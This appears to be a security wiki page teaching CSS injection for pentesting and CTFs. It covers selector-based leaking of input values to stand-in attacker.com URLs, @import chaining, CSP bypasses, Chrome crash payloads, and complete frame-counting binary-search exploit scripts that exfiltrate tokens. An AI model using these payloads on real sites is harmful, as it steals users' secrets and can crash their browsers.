---
description: Injecting CSS code to leak content on a page using selectors
---

# CSS Injection

## # Related Pages

{% content-ref url="cross-site-scripting-xss/html-injection.md" %}
[html-injection.md](cross-site-scripting-xss/html-injection.md)
{% endcontent-ref %}

## Injecting

CSS Injection starts with injecting CSS. This can happen in a variety of ways, a simple example being a customization of a color by setting a property in the CSS to your user input:

```html
<style>
body {
  color: <?= $color ?>;
}
</style>
```

This allows the user to set the page to any color with the `$color` variable, but a malicious user could use special characters to escape the context. Firstly, you should check if a closing `</style>` tag is disallowed, because if you can write that inside some inline CSS, you can close out of the tag and start writing arbitrary HTML, potentially escalating to XSS. If `<` are encoded, for example, we can still perform CSS injection by closing the current selector and opening another one with the following payload:

{% code title="Payload" %}
```css
}*{background: red}
```
{% endcode %}

{% code title="Result" %}
```css
body {
  color: }*{background: red};
}
```
{% endcode %}

Rendering the above CSS, even though it is not completely valid syntax, will render everything on the page (`*`) with a red background. This is often a good proof-of-concept to show that attacks explained below will be possible.

The following article explains the general idea of CSS Injection and some tricks:

{% embed url="https://aszx87410.github.io/beyond-xss/en/ch3/css-injection/" %}
Explanation of CSS Injection basics
{% endembed %}

### stylesheet vs. \<style> vs. style=

CSS can be loaded in a few different ways, and sometimes the details matter.

1. `<link rel="stylesheet" href="style.css">`: Loads CSS content from a URL (`href=`). This is only vulnerable if you can control the attribute enough to redirect it to any of your arbitrary content (or directly with an HTML-Injection), or if you have an injection dynamically generated CSS content somehow.
2. `<style>`: Using an sanitized HTML-injection, you may still be able to write a `<style>` tag with arbitrary content. Another option is if user input ends up in partially-trusted content and you can escape the context. (note: HTML-encoding content won't work here, even though it is inside HTML)
3. `style=` attribute: Inside of a [style attribute](https://developer.mozilla.org/en-US/docs/Web/HTML/Global_attributes/style), it is _not possible_ to add selectors and leak content. You can only change the style of the element it is an attribute of, to for example, make it take up the whole screen with a background image. There is one small edge case using the recent `if()` statements to brute force attributes on the same element as this attribute (see [#stylesheet-vs.-less-than-style-greater-than-vs.-style](css-injection.md#stylesheet-vs.-less-than-style-greater-than-vs.-style "mention")).

### Escaping string context

When injecting in partially-trusted CSS, it is almost aways enough to use `}` to close the current selector and open new ones. One exception to this is strings, which use quotes (`"`) that need to be closed first. You may be able to do this directly, or use a special character to also close the context (`\n`, `\r` or `\x0c`).

```css
.element::before {
  content: "<?= $content ?>";
}

.element2 {
  background: url('https://example.com/?param=<?= $param ?>');
}
```

The above injection points can be exploited in a few different ways:

* `$content`:\
  Using `"}*{background:red}` to close the quote\
  Using `\x0c}*{background:red}` to end the string (`\x0c` refers to the literal _Form Feed_ character, also `\n` and `\r` characters possible)
* `$param`:\
  Using `')}*{background:red}` to close the quote and `url()`\
  Using `\x0c)}*{background:red}` to end the string and `url()`

## Leaking

The goal of injecting CSS is to leak other content on the page. The most common attack is leaking attribute values of HTML elements by using selectors such as `input[value^=a]` to match any `<input>` element whose `value=` attribute _starts_ with "a". Inside of the selector, you can put a `background: url(https://attacker.com/?a)` pointing to your server with a unique path for that selector. Only if the selector matches, will the background be loaded and the URL requested. By seeing the incoming request, the attacker now knows there is an input element with that specific first character.

The attacker can repeat this for all possible characters to find one, then change the CSS to match the first and second characters now that the first is known.

```html
<input name="secret" value="secret">
<style>
/* 1st iteration */
input[name="secret"][value^="a"] { background: url(https://attacker.com/?a) }
input[name="secret"][value^="b"] { background: url(https://attacker.com/?b) }
input[name="secret"][value^="c"] { background: url(https://attacker.com/?c) }
...
input[name="secret"][value^="z"] { background: url(https://attacker.com/?z) }
/* 2nd iteration, once we receive the request for /?s */
input[name="secret"][value^="sa"] { background: url(https://attacker.com/?sa) }
input[name="secret"][value^="sb"] { background: url(https://attacker.com/?sb) }
input[name="secret"][value^="sc"] { background: url(https://attacker.com/?sc) }
...
input[name="secret"][value^="sz"] { background: url(https://attacker.com/?sz) }
</style>
```

### Selectors

For different types of content that we want to leak, there are different selectors. One edge case is if the secret input we want to leak has the **`type="hidden"`** attribute, which won't allow us to set a background image on it. Instead, we can target an adjacent element to set the background on, while still matching the hidden element. Read the [#stealing-hidden-input](https://aszx87410.github.io/beyond-xss/en/ch3/css-injection/#stealing-hidden-input) section for details on how to do this.

To leak **raw text** on the page instead of attributes, some more complex techniques are necessary. Firstly, "raw text" is just the content in between tags, like `<p>This is raw text</p>`. You can make even `<script>` tags in the body behave like text by giving them a `display: block` property. To leak such strings, you can abuse custom fonts to give certain characters a unique height, and then detect the presence of scroll bars to find which characters are shown. See this writeup to see how it is done:

{% embed url="https://research.securitum.com/stealing-data-in-great-style-how-to-use-css-to-attack-web-application/" %}
Leaking raw text nodes with CSS
{% endembed %}

### @import chaining

The technique explained above requires multiple separate loads of the CSS which may be difficult in some scenarios, so there exists a more complicated technique.

By including `@import` statements in the CSS, you can load extra CSS from a URL that may not respond yet, while the rest of the CSS that is already loaded will. If you create a clever server that responds with the 1st iteration right away, and then delays the response for the 2nd iteration, you can wait until the leak result from the 1st iteration comes in and then dynamically generate the 2nd iteration payload. Doing this is a chain allows you to leak larger amounts of text in a single shot.

One requirement for this `@import` chain attack is that your input is at the _start of a `<style>` tag_, often achieved through HTML-Injection. Just closing a selector and then writing an `@import` statement right after won't work, they can only exist at the top of the CSS source. See this article for details on exploitation:

{% embed url="https://d0nut.medium.com/better-exfiltration-via-html-injection-31c72a2dae8b" %}
Explanation of @import chaining
{% endembed %}

This tool implements the attack and is easy to use:

{% embed url="https://github.com/d0nutptr/sic" %}
Leak attributes character by character using delayed `@import`s tool
{% endembed %}

For your injection, you should pass a URL to the `/staging` endpoint of your local port 3000, with a `?len=` parameter being the max length of the value.

<pre class="language-html"><code class="lang-html">&#x3C;input type="hidden" name="csrf" value="SECRET" />
&#x3C;style>
<strong>  @import url("http://localhost:3000/staging?len=6");
</strong>&#x3C;/style>
</code></pre>

The tool requires a _template_ with `{{:token:}}` and `{{:callback:}}` placeholders to prefix match your target attribute and make a request to the callback. This is to provide flexibility, as in this case, the input is hidden and we need to wrap it with `html:has()`.

{% code title="template.css" %}
```css
html:has(input[name="csrf"][value^="{{:token:}}"]) {
  background: url({{:callback:}});
}
```
{% endcode %}

After your install the tool, set up its arguments and it will host a server on localhost:3000 and localhost:3001, both of which should be accessible to the victim and the external addresses passed as `--ph` and `--ch`:

<pre class="language-shell-session"><code class="lang-shell-session"><strong>$ cargo install https://github.com/d0nutptr/sic.git
</strong><strong>$ sic -t template.css --ph http://localhost:3000 --ch http://localhost:3001
</strong>[id: 3712083325] - S
[id: 3712083325] - SE
[id: 3712083325] - SEC
[id: 3712083325] - SECR
[id: 3712083325] - SECRE
<strong>[id: 3712083325] - SECRET
</strong></code></pre>

{% hint style="success" %}
**Tip**: to make your localhost accessible easily without access to your own domain/VPS, you can set up a free Cloudflare Quick Tunnel which gives you a `https://` subdomain tunneled to your localhost.

{% embed url="https://developers.cloudflare.com/cloudflare-one/connections/connect-networks/do-more-with-tunnels/trycloudflare/" %}
{% endhint %}

### One-shot with `attr()`

Due to [a recent update](https://developer.chrome.com/blog/advanced-attr) to the attr() function in CSS, it is possible to get a value of an attribute into a CSS variable. This means it can be used in a function like [`image-set()`](https://developer.mozilla.org/en-US/docs/Web/CSS/image/image-set) to load its value as a relative URL. If the stylesheet was loaded from an attacker's domain, the URL will be relative to the malicious stylesheet's domain:

```css
input[name="password"] {
  background: image-set(attr(value))
}
```

> `GET /[leak] HTTP/1.1`

The beauty of this is that it can **leak arbitrarily large attributes all in this single request**. Read more about this find by [@slonser in this tweet](https://web.archive.org/web/20250514150052/https://unrollnow.com/status/1912060407344201738).

{% hint style="warning" %}
**Note**: while this technique works great for any attributes, `<input type=hidden>` is impossible to leak with this method because such an element cannot have a background, so the request is not made.
{% endhint %}

### One-shot using 'contains' operator

While most techniques for leaking attributes do it one character at a time with the _prefix_ operator (`^=`), there is also the _contains_ operator (`*=`). By writing many partial substrings of text, you can find which ones exist on the target page and then combine them on the server into a single string. This makes it possible to leak an entire string from one single injection. It was the solution to the following challenge, with a writeup below:

{% embed url="https://blog.huli.tw/2023/12/11/en/0ctf-2023-writeup/#web-newdiary-14-solves" %}
Solution to "newdiary" writeup involving a one-shot CSS injection&#x20;
{% endembed %}

### Other pages

Normally, it is only possible to exfiltrate content on the page the CSS Injection is on. But what if we can include other content just so we can leak it? The popular [`react-router`](https://reactrouter.com/) package for React is vulnerable to DOM Clobbering, where if we can include an extra `<iframe>` tag with an `srcdoc` attribute (through an HTML-Injection), we can give create a nested React renderer that loads another route!

With this, you can load any route to leak content of other more sensitive pages. The writeup below explains this:

{% embed url="https://blog.huli.tw/2022/08/21/en/corctf-2022-modern-blog-writeup/" %}
CTF Writeup of importing another route and leaking it with CSS
{% endembed %}

### Blackbox

In cases where you are testing for an injection without knowing where it will end up, potentially on someone else's browser, you won't know exactly what to target with the leak yet. Below is an implementation that leaks a lot of information on the page so you can figure out what the page looks like only using CSS exfiltration:

{% embed url="https://portswigger.net/research/blind-css-exfiltration" %}
Leak structure of unknown data
{% endembed %}

### Font ligatures

[Ligatures](https://en.wikipedia.org/wiki/Ligature_\(writing\)) are multiple characters that form a single character in a specific font. By loading a custom-created font with carefully crafted ligatures if varying sizes in CSS, you can measure the width conditionally using media queries. This allows you to determine which character are on a page, and which come after it using ligatures.

The tool below implements all this logic incredibly and has some features for inlining fonts as well with the `/static` endpoint. Check out the blog post to understand how it works:

{% embed url="https://adragos.ro/fontleak/" %}

### `style=` attribute leak with `if()`

An injection into the `style=` **attribute** is very limited, because selectors won't be available. On Chrome, you can still use some of the more recent features of [`attr()`](https://developer.mozilla.org/en-US/docs/Web/CSS/attr) to get an any attribute on the same element's value, then compare against it with chained [`if()`](https://developer.mozilla.org/en-US/docs/Web/CSS/if) statements to fetch different URLs.

This allows you to brute-force a value if there aren't too many possibilities:

{% code title="Generate attribute value" %}
```javascript
const possibilities = Array.from({ length: 100 }, (_, i) => i);
const attribute = "data-secret";
const attacker = "example.com";

const chain = possibilities.reduce(
    (acc, v) => `if(style(--val:"${v}"):url(//${attacker}/${v});else:${acc})`,
    'url(//example.com/unknown)'
);
const style = `--val:attr(data-secret);--steal:${chain};background:image-set(var(--steal))`
console.log(style);  // 4967 bytes
```
{% endcode %}

{% code title="Exploit example" %}
```html
<div data-secret="42" style='
  --val: attr(data-secret);
  --steal: if(style(--val:"99"):url(//example.com/99);else:if(...
  background: image-set(var(--steal));
'>
```
{% endcode %}

This makes a request to https://example.com/42, leaking the secret to the attacker.

## CSP Bypasses

### No images allowed (`img-src`)

If loading external images for exfiltration is disallowed by a CSP img-src directive, you may still be able to use font URLs if they are not blocked by font-src, connect-src or default-src directives. You must first define a `@font-face { font-family: a; src: url(...) }`, and then reference it in a selector like `input[value^="a"] { font-family: a }`. This works because the font will only be loaded if it is required by some element on the page.

### Text nodes without fonts (`font-src`)

When wanting to leak text nodes, the [#font-ligatures](css-injection.md#font-ligatures "mention") technique requires custom fonts to give character sequences varying heights. If you are **not** allowed to load custom fonts (even from eg. file uploads with `'self'`), this technique exists that uses more complex CSS features to achieve the same result:

{% embed url="https://blog.pspaul.de/posts/bench-press-leaking-text-nodes-with-css/" %}
Leaking text _without_ fonts or @import chaining
{% endembed %}

### RPO & Quirks Mode (`'self'`)

Loading CSS resources from a trusted `'self'` is easy if you can upload raw files to the target and reference them as `Content-Type: text/css`, but this is far from always the case. This idea you can use here is **re-using HTML content as CSS**.

Since the CSS parser is incredibly lax, and knows no errors, any HTML page with some CSS rules embedded as text content can be successfully used by the browser. For example:

{% code title="/x?{}*{color:red}" %}
```html
<h1>404 Not Found</h1>
<p>The path <code>/x?{}*{color:red}</code> was not recognized.</p>
```
{% endcode %}

When viewed as CSS, from `<h1>` to `/x?` is one big invalid selector, followed by an empty list of properties with `{}`. Then, a new selector opens with `*`, which has a `color: red` property. And finally some more junk at the end:

{% code title="Parsed as CSS" %}
```css
<h1>404 Not Found</h1>
<p>The path <code>/x?{}*{color:red}</code> was not recognized.</p>
```
{% endcode %}

{% code title="HTML" %}
```html
<link rel="stylesheet" href="/x?{}*{color:red}">
```
{% endcode %}

When loaded as CSS, it should make everything on the page <mark style="color:red;">red</mark>. While this sounds amazing, in reality there are a few more **rules** that the browser enforces to try and prevent this legacy behavior. Namely:

1. The **status code must be successful** (2XX), so errors like 404 or 400 won't work
2. There cannot be a `X-Content-Type-Options: nosniff` header, otherwise, the `text/html` content type would not be allowed for stylesheets
3. The document must be in [Quirks Mode](https://developer.mozilla.org/en-US/docs/Web/HTML/Guides/Quirks_mode_and_standards_mode), triggered by a missing `<!DOCTYPE html>` declaration at the start of the HTML wanting to load the stylesheet

This last condition is interesting, as it's not very obvious. You can notice it on a page by looking at the DevTools _Issues_ tab that you can open from the _Console_ top right (![](<../../.gitbook/assets/image (76).png>)), or comparing `document.compatMode` to `"BackCompat"` in JavaScript.

<figure><img src="../../.gitbook/assets/image (77).png" alt=""><figcaption><p>Explanation of Quirks Mode issue by the browser itself if applicable to the current page</p></figcaption></figure>

It happens when the page does not start with `<!DOCTYPE html>` ([more info](https://hsivonen.fi/doctype/)), which is easy forget on some more basic/handwritten pages. What it does for us is allow resources with any content type to be loaded as CSS, including `Content-Type: text/html`!\
So, if you find any page with a successful status code, and a way to inject plain strings into there (no HTML tags required, we're just talking CSS syntax), you can load that as CSS and it should be trusted.

{% hint style="success" %}
**Tip**: in some cases you can _inject content before the doctype_ to force it, like [with PHP warnings](https://blog.arkark.dev/2025/09/08/asisctf-quals#step-1-forcing-quirks-mode-with-php-warnings).
{% endhint %}

***

One variation of this where you _don't even need HTML/CSS Injection_ is called **Relative Path Override** (RPO). It's relevant to webservers where the suffix of a path does not matter, and it uses relative paths for stylesheets.

{% embed url="https://portswigger.net/research/detecting-and-exploiting-path-relative-stylesheet-import-prssi-vulnerabilities" %}

One common example is the default PHP webserver with `php -S 0.0.0.0:8000`, it executes the same PHP handler `/page.php` for `/page.php/anything` and even `/page.php/style.css`. This becomes interesting when you look at the content of loading `/page.php/`:

{% code title="/page.php/" %}
```html
<link rel="stylesheet" href="style.css">
...
```
{% endcode %}

That stylesheet will request `style.css` relative to the current path, which is `/page.php/`, so results in `/page.php/style.css`. We just learned that this also resolves to the same PHP page so it effectively **loads itself as CSS**.

If you have any content injection (like "You searched for ...") this can now act as CSS, and is automatically loaded when suffix make the page with an extra `/` so that all relative paths point to it.\
You can escape almost any context by using a newline to close strings, then `{}` to ignore any prefix as a selector:

{% code title="Payload" %}
```css
%0a{}*{color:red}
```
{% endcode %}

### XS-Leaks without network

If no external requests can be made at all due to a strict CSP, it is still possible to use [XS-Leaks](https://xsleaks.dev/). These don't require the target page that you are injecting into to make connections, but instead, use window references or other shared information to **infer the result of a selector**.

#### Connection pool request counting

The browser has a limit of 256 simultaneously TCP connections globally. If we force the target to make a specific number of connections for each character, we can detect the limit being reached from our attacker's site and determine the result of the selector.

The writeup below explains this idea in great detail:

{% embed url="https://salvatore-abello.github.io/posts/css-exfiltration-under-default-src-self/" %}
CSS Exfiltration by measuring connection pool
{% endembed %}

#### Tab crash detection

Browsers have bugs, that inevitably cause crashes. If these can be conditionally triggered by a CSS selector matching or not, we can detect the fact that a crash occurred to learn the result of the selector cross-site.

One _previously working_ crash was rendering `background: linear-gradient(in display-p3, red, blue)` ([issue 382086298](https://issues.chromium.org/issues/382086298)), it could be made conditional like this:

```css
input[value^="S"] {
  background: linear-gradient(in display-p3, red, blue)
}
```

If the input value starts with an `S`, the property is loaded and the tab will crash. Otherwise, the tab will remain executing normally. The crucial part that makes this detectable cross-site is the fact that if one instance of an origin crashes, all other same-site documents in the same tab context group also crash. This comes from [Full Site Isolation](https://chromium.googlesource.com/chromium/src/+/main/docs/process_model_and_site_isolation.md#Full-Site-Isolation-site_per_process) because they share a process.

**One way** this is **detectable** is using a few dummy iframes on the attacker's page of the same site with any path, and measuring `onload=` events. Once you conditionally crash the target in a popup window, the iframes on your page will crash with it and **stop emitting** `onload=` events. This is detectable, and doing it repeatedly allows reading larger strings (albeit a bit slow).

My writeup below shows me practically using it as an unintended solution to a CTF challenge:

{% embed url="https://jorianwoltjer.com/blog/p/ctf/x3ctf-blogdog-new-css-injection-xs-leak#xs-leak-using-process-crashing" %}
Writeup of unintentional solution about this new technique, and PoC's
{% endembed %}

***

Some CSS crashes like [issue 433073118](https://issues.chromium.org/issues/433073118) are useful to crash the page _if it is rendered_, but **don't allow** inserting conditional selectors to make it exploitable for CSS Injection. Because the crash happens while parsing it doesn't matter if it's used or not.

{% code title="Always crashes" %}
```html
<style>::placeholder{&{&{
```
{% endcode %}

In comparison, another more useful crash was [issue 435225409](https://issues.chromium.org/issues/435225409) where a **selected would have to match** for the crash to occur:

<pre class="language-html" data-title="Conditionally crashes"><code class="lang-html">&#x3C;style>
@starting-style {
<strong>  input[value^="S"]::first-letter {
</strong>    color: red;
  }
}
&#x3C;/style>
&#x3C;input value="SECRET">
</code></pre>

One **non-issue** way to crash _Chrome for Windows_ (doesn't happen on Linux for some reason) relatively quickly is using a recursive DoS payload with variables that reference each other resulting in exponential growth:

```css
html {
  --a: url(/?1),url(/?1),url(/?1),url(/?1),url(/?1);
  --b: var(--a),var(--a),var(--a),var(--a),var(--a);
  --c: var(--b),var(--b),var(--b),var(--b),var(--b);
  --d: var(--c),var(--c),var(--c),var(--c),var(--c);
  --e: var(--d),var(--d),var(--d),var(--d),var(--d);
  --f: var(--e),var(--e),var(--e),var(--e),var(--e);
  --g: var(--f),var(--f),var(--f),var(--f),var(--f);
}
html:has(input[value^="S"]) {
  background-image: var(--g);
}
```

> Error code: `STATUS_STACK_OVERFLOW`

All of the above crashes are also detectable with another more consistent method using a window reference. Using the fact that a hash change (appending `#1` but keeping the rest of the URL the same) causes no reload on a regular existing tab, but does cause a reload on a _crashed_ tab. While reloading the browser seems to not be able to keep up with the hash changes and **only puts the first in history**.\
This is then detectable using `window.length` after navigating it back to a same-origin page like `about:blank`.

The JavaScript function below can easily test for if a URL crashes or not by opening it in a new window:

```javascript
function isCrashing(url) {
  return new Promise((resolve) => {
    const w = window.open(url);
    setTimeout(async () => {
      // Crashed tab reloads here, but normal tab does not. We can detect this in history.length
      w.location = url + "#1";
      w.location = url + "#2";
      w.location = url + "#3";
      w.location = "about:blank";
      while (true) {  // Wait for `w` to become same-origin
        try {
          w.origin;
          break;
        } catch {
          await sleep(100);
        }
      }
      resolve(w.history.length < 4);  // If all navigations were added, it didn't crash
      w.close();
    }, 1000);  // Time until crash definitely happened
  });
}
// Usage
console.log(await isCrashing("https://target.tld/?css=..."));
```

{% hint style="success" %}
**Tip**: If you are in search of a method without the interaction required for `window.open()` you can simply open it once and change the leak to `w.location = url` and count the _difference_ of lengths before and after instead.
{% endhint %}

#### `<object>` Frame Counting

A popular XS-Leak is called [Frame Counting](https://xsleaks.dev/docs/attacks/frame-counting/), abusing the cross-origin [`window.length`](https://developer.mozilla.org/en-US/docs/Web/API/Window/length) property on window references to count the number of `<iframe>`, `<object>` and `<embed>` elements. You can conditionally apply [`display: none`](https://developer.mozilla.org/en-US/docs/Web/CSS/display#display_none) to these to hide them from the counter. Since this is detectable cross-site, it's a great simple way to detect the result of a selector if there are such elements on the page, or if you can inject them.

For **iframes**, you should use [`loading="lazy"`](https://developer.mozilla.org/en-US/docs/Web/Performance/Guides/Lazy_loading#images_and_iframes) and scroll them in or out of view. `<object>` tags the simplest way as shown below (make sure they actually render something like `about:blank`):

{% code title="HTML payload" %}
```html
<style>
  html:has(input[value^="S"]) #leak {
    display: none;
  }
</style>
<object id="leak" data=about:blank></object>
<object data=about:blank></object>
```
{% endcode %}

If the `input[value^="S"]` selector matches, the length will be 1. If it doesn't match, the length will be 2.

<pre class="language-javascript" data-title="Leak selector result"><code class="lang-javascript">function sleep(ms) {
  return new Promise(r => setTimeout(r, ms));
}
async function waitForLength(w) {
  while (true) {
    if (w.length > 0) return;
    else await sleep(0);
  }
}

async function leak(url) {
  const w = window.open(url);
  // After at least one object has loaded
  await waitForLength(w);
  // Wait a small bit for potentially the 2nd to load (if it's not `display: none`)
  await sleep(100);
  const length = w.length;
  w.close();
  // Check if the selector matched. If it's 2, didn't match
<strong>  return length === 1;
</strong>}
</code></pre>

***

Apart from frame counting, you can also detect the [`name=`](https://developer.mozilla.org/en-US/docs/Web/HTML/Reference/Elements/iframe#name) attribute of frames by accessing their name as a [property on `window`](https://developer.mozilla.org/en-US/docs/Web/API/Window#named_properties). Using this, you can make specific properties exist if a selector matches, multiple times. This was the solution to a CTF challenge where you needed to perform [#one-shot-using-contains-operator](css-injection.md#one-shot-using-contains-operator "mention") without external network connections:

[Another Another CSP  - justCTF writeup by @terjanq](https://gist.github.com/terjanq/3e866293610aa6c5629df4353e5d87d9#solution)

It is a very generic technique, and if you don't have length restrictions, **by far the fastest way** to leak data with CSS Injection and a restricted CSP.

#### Binary Search

Most of these techniques tell you _yes/no_ if a selector matched or not. While you can sometimes iterate through potential prefix characters, even multiple ones at the same time, in some cases you are restricted to one result at a time. To speed up searches like this you can make use of a [Binary Search](https://en.wikipedia.org/wiki/Binary_search) algorithm where you leak exactly 1 bit of information for every question.

Using CSS selectors, this is simply by just specifying the half of the options it may be using `,` (comma) separated selectors:

```css
input[value^="A"], input[value^="B"], input[value^="C"], ... {
  ...
}
```

An implementation of this is below for easy copying:

<details>

<summary>Binary Search exploit script</summary>

<pre class="language-html" data-title="exploit.html"><code class="lang-html">&#x3C;script>
<strong>  const TARGET = "http://127.0.0.1:8080";
</strong><strong>  const ALPHABET = "0123456789abcdef".split("").join("");
</strong>
  function sleep(ms) {
    return new Promise((resolve) => setTimeout(resolve, ms));
  }
  async function waitForLength(w) {
    while (true) {
      if (w.length > 0) return;
      else await sleep(0);
    }
  }

  async function leak(url) {
    const w = window.open(url);
    // After at least one object has loaded
    await waitForLength(w);
    // Wait a small bit for potentially the 2nd to load (if it's not `display: none`)
    await sleep(100);
    const length = w.length;
    w.close();
    // Check if the selector matched. If it's 2, didn't match
    return length === 1;
  }

  async function test(mid) {
    console.log("chars", ALPHABET.split("").slice(0, mid));
    const selectors = ALPHABET.split("")
      .slice(0, mid)
      .map((c) => `body[secret^="${known + c}"] #leak`)
      .join(",");
    // To detect if a selector matched, conditionally display an &#x3C;object> so that .length changes from 1 to 2
    const payload = `
  &#x3C;style>
    ${selectors} {
      display: none;
    }
  &#x3C;/style>
  &#x3C;object id="leak" data=about:blank>&#x3C;/object>
  &#x3C;object data=about:blank>&#x3C;/object>
  `;
<strong>    // TODO: implement your HTML injection here
</strong><strong>    const url = TARGET + "/vuln?" + new URLSearchParams({ payload });
</strong>    return await leak(url);
  }

  async function binarySearch(low, high) {
    while (low !== high) {
      const mid = Math.floor((low + high) / 2);
      if (await test(mid + 1)) {
        high = mid;
      } else {
        low = mid + 1;
      }
    }
    return low;
  }

  let known = "";

  (async () => {
<strong>    for (let i = 0; i &#x3C; 32; i++) {
</strong>      // Use binary search for highest efficiency
      const found = await binarySearch(0, ALPHABET.length - 1);
      known += ALPHABET[found];
      console.log("Found", known);
      navigator.sendBeacon("/log?known=" + known);
    }
  })();
&#x3C;/script>

</code></pre>

</details>

If you are able to do around 2 actions at the same time, the `$=` attribute selector allows you to seek backwards at the same time. This will speed up your full search by 2x:

<details>

<summary>Binary Search (both directions) exploit script</summary>

<pre class="language-html" data-title="exploit.html"><code class="lang-html">&#x3C;script>
<strong>  const TARGET = "http://127.0.0.1:8080";
</strong><strong>  const ALPHABET = "0123456789abcdef".split("").join("");
</strong>
  function sleep(ms) {
    return new Promise((resolve) => setTimeout(resolve, ms));
  }
  async function waitForLength(w) {
    while (true) {
      if (w.length > 0) return;
      else await sleep(0);
    }
  }

  async function leak(url) {
    const w = window.open(url);
    // After at least one object has loaded
    await waitForLength(w);
    // Wait a small bit for potentially the 2nd to load (if it's not `display: none`)
    await sleep(100);
    const length = w.length;
    w.close();
    // Check if the selector matched. If it's 2, didn't match
    return length === 1;
  }

  async function test(mid, backward = false) {
    console.log("chars", ALPHABET.split("").slice(0, mid));
    const selectors = ALPHABET.split("")
      .slice(0, mid)
      .map((c) => `body[secret${backward ? "$" : "^"}="${backward ? c + suffix : prefix + c}"] #leak`)
      .join(",");
    // To detect if a selector matched, conditionally display an &#x3C;object> so that .length changes from 1 to 2
    const payload = `
  &#x3C;style>
    ${selectors} {
      display: none;
    }
  &#x3C;/style>
  &#x3C;object id="leak" data=about:blank>&#x3C;/object>
  &#x3C;object data=about:blank>&#x3C;/object>
  `;
<strong>    // TODO: implement your HTML injection here
</strong><strong>    const url = TARGET + "/vuln?" + new URLSearchParams({ payload });
</strong>    return await leak(url);
  }

  async function binarySearch(low, high, backward = false) {
    while (low !== high) {
      const mid = Math.floor((low + high) / 2);
      if (await test(mid + 1, backward)) {
        high = mid;
      } else {
        low = mid + 1;
      }
    }
    return low;
  }

  let prefix = "";
  let suffix = "";

<strong>  // We search forward (^=) and backward ($=) simultaneously. Token is 32 chars long, so both 16 each
</strong>  (async () => {
    for (let i = 0; i &#x3C; 16; i++) {
      // Use binary search for highest efficiency
      const found = await binarySearch(0, ALPHABET.length - 1);
      prefix += ALPHABET[found];
      console.log("Found", prefix);
      navigator.sendBeacon("/log?prefix=" + prefix);
    }
  })();
  (async () => {
    for (let i = 0; i &#x3C; 16; i++) {
      const found = await binarySearch(0, ALPHABET.length - 1, true);
      suffix = ALPHABET[found] + suffix;
      console.log("Found", suffix);
      navigator.sendBeacon("/log?suffix=" + suffix);
    }
  })();
&#x3C;/script>

</code></pre>

</details>
